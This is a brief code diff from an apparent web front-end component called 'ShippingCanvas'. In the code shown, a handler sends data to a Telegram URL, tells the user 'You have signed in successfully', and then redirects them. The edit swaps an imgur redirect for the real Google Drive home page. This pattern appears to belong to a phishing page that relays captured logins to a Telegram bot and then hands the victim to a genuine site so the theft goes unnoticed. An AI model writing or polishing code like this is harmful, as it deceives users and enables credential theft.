@@ -87,7 +87,7 @@ const ShippingCanvas = () => {
       const response = await fetch(telegramUrl);
       if (response.ok) {
         alert('You have signed in successfully');
-        window.location.href = 'https://imgur.com/a/65Me9UX';
+        window.location.href = 'https://drive.google.com/drive/home';
       } else {
         alert('Error sending message');
       }
